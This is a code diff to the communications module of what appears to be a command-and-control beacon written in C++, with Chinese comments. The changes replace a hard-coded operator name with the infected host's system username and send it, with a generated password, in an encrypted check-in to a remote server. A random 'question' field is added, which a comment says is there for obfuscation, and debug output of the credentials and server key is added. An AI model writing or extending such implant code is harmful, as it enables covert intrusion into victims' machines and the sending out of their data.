@@ -166,6 +166,13 @@ namespace Grimoire::Comms {
         // 设置接收回调函数和缓冲区
         curl_easy_setopt(curl_handle_, CURLOPT_WRITEDATA, &response_data);
 
+        std::string username = Utils::GetSystemUsername();
+        std::string password = Utils::GenerateRandomString(12);
+
+
+        std::cout << "[Comms] Username: " << username << std::endl;
+        std::cout << "[Comms] Password: " << password << std::endl;
+
         try {
             // 生成密钥并获取客户端临时公钥
             std::string beacon_temp_pub_key_b64 = crypto_manager_->GenerateClientKey();
@@ -173,8 +180,8 @@ namespace Grimoire::Comms {
             // 构造 JSON 负载 (使用客户端临时公钥)
             json checkin_payload = {
                 {"hello", beacon_temp_pub_key_b64},
-                {"user", "Nebu1ea"},
-                {"password", "Nebu1ea"}
+                {"user", username},
+                {"password", password}
             };
             std::string json_payload = checkin_payload.dump();
 
@@ -210,6 +217,8 @@ namespace Grimoire::Comms {
 
             if (response_json.contains("welcome")) {
                 std::string server_public_key_b64 = response_json["welcome"];
+                std::cout << "[Comms] Server public key b64: " << server_public_key_b64 << std::endl;
+
 
                 // 接收服务器公钥，完成密钥派生
                 if (crypto_manager_->CompleteKeyDerivation(server_public_key_b64)) {
@@ -318,7 +327,7 @@ namespace Grimoire::Comms {
                 {"auth", encrypted_payload_b64},
                 // 使用随机字符串增加混淆度
                 {"question", Utils::GenerateRandomString(16)},
-                {"user", "Nebu1ea"}
+                {"user", Utils::GetSystemUsername()}
             };
             std::string json_payload = external_payload.dump();
 
